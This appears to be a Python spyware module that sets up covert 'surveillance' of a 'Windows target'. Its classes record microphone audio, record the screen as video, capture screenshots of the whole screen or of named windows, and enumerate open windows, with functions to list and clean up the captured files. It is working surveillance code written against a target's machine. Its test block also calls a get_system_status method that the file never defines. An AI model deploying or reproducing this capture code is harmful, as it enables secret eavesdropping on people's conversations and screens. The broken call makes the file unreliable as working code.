import os
import sys
import time
import threading
import json
from datetime import datetime

# Audio and screen recording imports
import pyaudio
import wave

import cv2
import numpy as np

from PIL import ImageGrab, Image
import pyautogui
import win32gui


class AudioRecorder:
    """Audio recording functionality for Windows target"""
    
    def __init__(self, output_dir="recordings"):
        # Use absolute path to ensure proper file handling
        self.output_dir = os.path.abspath(output_dir)
        self.is_recording = False
        self.audio_thread = None
        self.chunk = 1024  # Record in chunks of 1024 samples
        self.sample_format = pyaudio.paInt16  # 16 bits per sample
        self.channels = 1  # Use mono for better Windows compatibility
        self.fs = 44100  # Sample rate
        self.filename = None
        self.frames = []
        
        # Ensure output directory exists
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        print(f"Audio recorder initialized: {self.output_dir}")
    
    def start_recording(self, duration=None, filename=None):
        """Start audio recording"""
        if self.is_recording:
            return False, "Already recording"
        
        # Generate filename if not provided
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio_{timestamp}.wav"
        
        self.filename = os.path.join(self.output_dir, filename)
        self.frames = []
        self.is_recording = True
        
        def record_audio():
            try:
                p = pyaudio.PyAudio()
                
                # Check available input devices
                input_device = None
                for i in range(p.get_device_count()):
                    device_info = p.get_device_info_by_index(i)
                    if device_info['maxInputChannels'] > 0:
                        input_device = i
                        break
                
                if input_device is None:
                    self.is_recording = False
                    return
                
                stream = p.open(format=self.sample_format,
                              channels=self.channels,
                              rate=self.fs,
                              frames_per_buffer=self.chunk,
                              input=True,
                              input_device_index=input_device)
                
                start_time = time.time()
                
                while self.is_recording:
                    data = stream.read(self.chunk, exception_on_overflow=False)
                    self.frames.append(data)
                    
                    # Stop if duration specified and reached
                    if duration and (time.time() - start_time) >= duration:
                        break
                
                # Stop and close the stream
                stream.stop_stream()
                stream.close()
                p.terminate()
                
                # Save the recorded data as a WAV file
                self.save_audio()
                
            except Exception as e:
                print(f"Audio recording error: {str(e)}")
                self.is_recording = False
        
        self.audio_thread = threading.Thread(target=record_audio, daemon=True)
        self.audio_thread.start()
        
        return True, f"Audio recording started: {self.filename}"
    
    def stop_recording(self):
        """Stop audio recording"""
        if not self.is_recording:
            return False, "Not currently recording"
        
        self.is_recording = False
        
        # Wait for thread to complete
        if self.audio_thread:
            self.audio_thread.join(timeout=5)
        
        return True, f"Audio recording stopped: {self.filename}"
    
    def save_audio(self):
        """Save recorded audio to WAV file"""
        try:
            wf = wave.open(self.filename, 'wb')
            wf.setnchannels(self.channels)
            wf.setsampwidth(pyaudio.PyAudio().get_sample_size(self.sample_format))
            wf.setframerate(self.fs)
            wf.writeframes(b''.join(self.frames))
            wf.close()
            return True
        except Exception as e:
            print(f"Error saving audio: {str(e)}")
            return False
    
    def get_audio_devices(self):
        """Get list of available audio input devices"""
        devices = []
        try:
            p = pyaudio.PyAudio()
            for i in range(p.get_device_count()):
                device_info = p.get_device_info_by_index(i)
                if device_info['maxInputChannels'] > 0:
                    devices.append({
                        'index': i,
                        'name': device_info['name'],
                        'channels': device_info['maxInputChannels'],
                        'sample_rate': device_info['defaultSampleRate']
                    })
            p.terminate()
        except Exception as e:
            print(f"Error getting audio devices: {str(e)}")
        
        return devices


class ScreenRecorder:
    """Screen recording and screenshot functionality for Windows target"""
    
    def __init__(self, output_dir="recordings"):
        # Use absolute path to ensure proper file handling
        self.output_dir = os.path.abspath(output_dir)
        self.is_recording = False
        self.video_thread = None
        self.fps = 10.0  # Frames per second
        self.filename = None
        self.fourcc = cv2.VideoWriter_fourcc(*'XVID')
        self.video_writer = None
        
        # Ensure output directory exists
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        print(f"Screen recorder initialized: {self.output_dir}")
    
    def take_screenshot(self, filename=None):
        """Take a screenshot on Windows target"""
        try:
            # Generate filename if not provided
            if filename is None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"screenshot_{timestamp}.png"
            
            # Use absolute path to ensure proper file creation
            filepath = os.path.join(self.output_dir, filename)
            
            # Take screenshot using PIL ImageGrab (Windows only)
            screenshot = ImageGrab.grab()
            screenshot.save(filepath)
            
            print(f"Screenshot saved to: {filepath}")
            return True, f"Screenshot saved: {filepath}"
            
        except Exception as e:
            return False, f"Screenshot error: {str(e)}"
    
    def start_screen_recording(self, duration=None, filename=None):
        """Start screen recording"""        
        if self.is_recording:
            return False, "Already recording"
        
        # Generate filename if not provided
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screen_{timestamp}.avi"
        
        self.filename = os.path.join(self.output_dir, filename)
        self.is_recording = True
        
        def record_screen():
            try:
                # Get screen dimensions
                screen_size = pyautogui.size()
                
                # Initialize video writer
                self.video_writer = cv2.VideoWriter(
                    self.filename, 
                    self.fourcc, 
                    self.fps, 
                    screen_size
                )
                
                start_time = time.time()
                
                while self.is_recording:
                    # Capture screenshot
                    screenshot = pyautogui.screenshot()
                    
                    # Convert PIL image to OpenCV format
                    frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
                    
                    # Write frame to video
                    self.video_writer.write(frame)
                    
                    # Control frame rate
                    time.sleep(1.0 / self.fps)
                    
                    # Stop if duration specified and reached
                    if duration and (time.time() - start_time) >= duration:
                        break
                
                # Release video writer
                if self.video_writer:
                    self.video_writer.release()
                
            except Exception as e:
                print(f"Screen recording error: {str(e)}")
                self.is_recording = False
        
        self.video_thread = threading.Thread(target=record_screen, daemon=True)
        self.video_thread.start()
        
        return True, f"Screen recording started: {self.filename}"
    
    def stop_screen_recording(self):
        """Stop screen recording"""
        if not self.is_recording:
            return False, "Not currently recording"
        
        self.is_recording = False
        
        # Wait for thread to complete
        if self.video_thread:
            self.video_thread.join(timeout=5)
        
        return True, f"Screen recording stopped: {self.filename}"
    
    def get_window_screenshot(self, window_title=None):
        """Take screenshot of specific window"""        
        try:
            if window_title:
                # Find window by title
                hwnd = win32gui.FindWindow(None, window_title)
                if hwnd:
                    # Get window position and size
                    rect = win32gui.GetWindowRect(hwnd)
                    x, y, x1, y1 = rect
                    
                    # Take screenshot of specific area
                    screenshot = ImageGrab.grab(bbox=(x, y, x1, y1))
                    
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"window_{window_title}_{timestamp}.png"
                    filepath = os.path.join(self.output_dir, filename)
                    
                    screenshot.save(filepath)
                    return True, f"Window screenshot saved: {filepath}"
                else:
                    return False, f"Window '{window_title}' not found"
            else:
                return self.take_screenshot()
                
        except Exception as e:
            return False, f"Window screenshot error: {str(e)}"
    
    def get_active_windows(self):
        """Get list of active windows"""        
        windows = []
        
        def enum_windows_callback(hwnd, windows):
            if win32gui.IsWindowVisible(hwnd):
                window_title = win32gui.GetWindowText(hwnd)
                if window_title:
                    windows.append({
                        'hwnd': hwnd,
                        'title': window_title,
                        'rect': win32gui.GetWindowRect(hwnd)
                    })
        
        try:
            win32gui.EnumWindows(enum_windows_callback, windows)
        except Exception as e:
            print(f"Error getting windows: {str(e)}")
        
        return windows


class SurveillanceRecorder:
    """Combined audio and video surveillance recorder for Windows target"""
    
    def __init__(self, output_dir="recordings"):
        # Use absolute path to ensure proper file handling
        self.output_dir = os.path.abspath(output_dir)
        self.audio_recorder = AudioRecorder(self.output_dir)
        self.screen_recorder = ScreenRecorder(self.output_dir)
        self.surveillance_active = False
        
        # Ensure output directory exists
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        
        print(f"Surveillance recorder initialized for Windows target: {self.output_dir}")
    
    def start_surveillance(self, duration=None, audio=True, video=True):
        """Start combined audio and video surveillance"""
        if self.surveillance_active:
            return False, "Surveillance already active"
        
        results = []
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Start audio recording
        if audio:
            try:
                audio_success, audio_msg = self.audio_recorder.start_recording(
                    duration=duration, 
                    filename=f"surveillance_audio_{timestamp}.wav"
                )
                results.append(f"Audio: {audio_msg}")
            except Exception as e:
                results.append(f"Audio: Error - {str(e)}")
        
        # Start screen recording
        if video:
            try:
                video_success, video_msg = self.screen_recorder.start_screen_recording(
                    duration=duration,
                    filename=f"surveillance_video_{timestamp}.avi"
                )
                results.append(f"Video: {video_msg}")
            except Exception as e:
                results.append(f"Video: Error - {str(e)}")
        
        self.surveillance_active = True
        return True, " | ".join(results)
    
    def stop_surveillance(self):
        """Stop all surveillance recording"""
        if not self.surveillance_active:
            return False, "No surveillance active"
        
        results = []
        
        # Stop audio recording
        if self.audio_recorder.is_recording:
            audio_success, audio_msg = self.audio_recorder.stop_recording()
            results.append(f"Audio: {audio_msg}")
        
        # Stop screen recording
        if self.screen_recorder.is_recording:
            video_success, video_msg = self.screen_recorder.stop_screen_recording()
            results.append(f"Video: {video_msg}")
        
        self.surveillance_active = False
        return True, " | ".join(results)
    
    def take_surveillance_snapshot(self):
        """Take immediate screenshot and short audio sample"""
        results = []
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Take screenshot
        screenshot_success, screenshot_msg = self.screen_recorder.take_screenshot(
            filename=f"snapshot_{timestamp}.png"
        )
        results.append(f"Screenshot: {screenshot_msg}")
        
        # Record short audio sample (5 seconds)
        try:
            audio_success, audio_msg = self.audio_recorder.start_recording(
                duration=5,
                filename=f"snapshot_audio_{timestamp}.wav"
            )
            results.append(f"Audio: {audio_msg}")
            
            # Wait for audio to complete
            time.sleep(6)
        except Exception as e:
            results.append(f"Audio: Error - {str(e)}")
        
        return True, " | ".join(results)
    
    def list_recordings(self):
        """List all recorded files"""
        recordings = []
        
        try:
            if os.path.exists(self.output_dir):
                files = os.listdir(self.output_dir)
                print(f"Found {len(files)} items in directory")
                
                for filename in files:
                    filepath = os.path.join(self.output_dir, filename)
                    if os.path.isfile(filepath):
                        stat = os.stat(filepath)
                        recordings.append({
                            'filename': filename,
                            'path': filepath,
                            'size': stat.st_size,
                            'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                            'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                        })
                        print(f"Added recording: {filename} ({stat.st_size} bytes)")
            else:
                print(f"Recordings directory does not exist: {self.output_dir}")
                
        except Exception as e:
            print(f"Error listing recordings: {str(e)}")
        
        return recordings
    
    def delete_recording(self, filename):
        """Delete a specific recording"""
        try:
            filepath = os.path.join(self.output_dir, filename)
            if os.path.exists(filepath):
                os.remove(filepath)
                return True, f"Deleted: {filename}"
            else:
                return False, f"File not found: {filename}"
        except Exception as e:
            return False, f"Error deleting {filename}: {str(e)}"
    
    def cleanup_old_recordings(self, days_old=7):
        """Clean up recordings older than specified days"""
        deleted_count = 0
        
        try:
            if os.path.exists(self.output_dir):
                current_time = time.time()
                cutoff_time = current_time - (days_old * 24 * 60 * 60)
                
                for filename in os.listdir(self.output_dir):
                    filepath = os.path.join(self.output_dir, filename)
                    if os.path.isfile(filepath):
                        file_time = os.path.getmtime(filepath)
                        if file_time < cutoff_time:
                            os.remove(filepath)
                            deleted_count += 1
        except Exception as e:
            print(f"Error during cleanup: {str(e)}")
        
        return deleted_count


# Factory function to create recorder
def create_surveillance_recorder(output_dir="recordings"):
    """Create surveillance recorder instance"""
    return SurveillanceRecorder(output_dir)


# Test the surveillance recorder
if __name__ == "__main__":
    print("Testing Surveillance Recorder...")
    
    recorder = create_surveillance_recorder("test_recordings")
    
    # Show system status
    status = recorder.get_system_status()
    print(f"\nSystem Status:")
    for key, value in status.items():
        if key not in ['audio_devices', 'active_windows']:
            print(f"  {key}: {value}")
    
    # Test screenshot
    print("\nTesting screenshot...")
    success, msg = recorder.screen_recorder.take_screenshot()
    print(f"Screenshot: {msg}")
    
    # Test short surveillance
    print("\nTesting 10-second surveillance...")
    success, msg = recorder.start_surveillance(duration=10, audio=True, video=True)
    print(f"Start: {msg}")
    
    # Wait for completion
    time.sleep(12)
    
    # Stop surveillance
    success, msg = recorder.stop_surveillance()
    print(f"Stop: {msg}")
    
    # List recordings
    recordings = recorder.list_recordings()
    print(f"\nRecordings created:")
    for recording in recordings:
        print(f"  - {recording['filename']} ({recording['size']} bytes)")
    
    print("\nSurveillance test completed!")